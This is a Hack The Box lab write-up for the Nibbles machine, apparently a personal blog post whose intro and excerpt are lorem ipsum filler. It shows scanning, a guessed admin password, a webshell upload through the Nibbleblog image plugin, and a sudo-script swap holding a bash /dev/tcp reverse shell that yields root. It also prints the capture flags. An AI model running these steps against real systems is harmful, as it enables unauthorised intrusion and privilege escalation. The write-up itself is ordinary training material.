---
layout: single
title: Nibbles - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-02-22
classes: wide
header:
  teaser: /assets/images/htb-writeup-nibbles/nibbles_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-nibbles/nibbles_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb/nibbles]# nmap -Pn -n -sCV 10.10.10.75 --open                                                                      (master✱)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
    |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
    |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


    DIRB:
      -

    NIKTO:
     Allowed HTTP Methods: GET, HEAD, POST, OPTIONS


2. Visiting the webpage we find '/nibbleblog/ directory. Nothing interesting here!' embedded as a comment in the code.

    DIRB:
      ---- Scanning URL: http://10.10.10.75/nibbleblog/ ----
      ==> DIRECTORY: http://10.10.10.75/nibbleblog/admin/
      + http://10.10.10.75/nibbleblog/admin.php (CODE:200|SIZE:1401)
      ==> DIRECTORY: http://10.10.10.75/nibbleblog/content/
      + http://10.10.10.75/nibbleblog/index.php (CODE:200|SIZE:2987)
      ==> DIRECTORY: http://10.10.10.75/nibbleblog/languages/
      ==> DIRECTORY: http://10.10.10.75/nibbleblog/plugins/
      + http://10.10.10.75/nibbleblog/README (CODE:200|SIZE:4628)
      ==> DIRECTORY: http://10.10.10.75/nibbleblog/themes/

    * On /nibbleblog/content/private/users.xml we find that the user ADMIN exists, however no password.
    * Uploaded files are stored at: http://10.10.10.75/nibbleblog/content/public/upload/
    * Trying SQLi on /nibbleblog/admin.php blacklists us : 'Nibbleblog security error - Blacklist protection'
    * Generated a wordlist with cewl and tried is as passwords for user ADMIN, but no success

    Randomly trying admin:nibbles gave access however!


3. Browse to 'http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image', press "Configure" on the
   'My image'-plugin. Browse for a webshell, or php-reverse and upload it.

   Go to http://10.10.10.75/nibbleblog/content/private/plugins/my_image/ and press 'image.php', this will return your rev-shell.

   [root:/git/htb/nibbles]# nc -lvnp 4488                                                                                            (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.10] from (UNKNOWN) [10.10.10.75] 45484
    Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
     10:58:49 up 45 min,  0 users,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
      nibbler

    nibbler@Nibbles:/home/nibbler$ cat user.txt
      405046e8f3fde67cc37f19a94e643a3c


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. As always, start by running 'sudo -l' to see if we have an easy path to root.

    nibbler@Nibbles:/home/nibbler$ sudo -l
      Matching Defaults entries for nibbler on Nibbles:
          env_reset, mail_badpass,
          secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

      User nibbler may run the following commands on Nibbles:
          (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


   The specifiec file and path does not exist, however we do find 'personal.zip' in our home.
    nibbler@Nibbles:/home/nibbler$ ls -al
      drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
      drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
      -r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip

   Unzip the file:
    nibbler@Nibbles:/home/nibbler$ unzip personal.zip
      unzip personal.zip
      Archive:  personal.zip
         creating: personal/
         creating: personal/stuff/
        inflating: personal/stuff/monitor.sh


2. Now we have sudo privileges to a bash-script that we can read, write and execute. We have two paths to root here:

  a) Modify the script to send a reverse shell back as root.
  b) Delete the script and create a new, with the same name (monitor.sh), to execute root commands for us (i.e. send rev shell)

  For me, I think option B is easiest.


  nibbler@Nibbles:/home/nibbler/personal/stuff/$ cat monitor.sh
    #!/bin/bash
    bash -i >& /dev/tcp/10.10.14.10/4499 0>&1

  nibbler@Nibbles:/home/nibbler/personal/stuff/$ chmod +x monitor.sh
  nibbler@Nibbles:/home/nibbler/personal/stuff/$ sudo /home/nibbler/personal/stuff/monitor.sh

  [root:/git/htb/nibbles]# nc -lvnp 4499                                                                                            (master✱)
    listening on [any] 4499 ...
    connect to [10.10.14.10] from (UNKNOWN) [10.10.10.75] 45302
    bash: cannot set terminal process group (1324): Inappropriate ioctl for device
    bash: no job control in this shell

  root@Nibbles:/home/nibbler/personal/stuff# whoami
    root
  root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
    0a39fa7459fb58a9f4e22cdaeb6b52c1


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Nibbleblog RCE:
  https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/
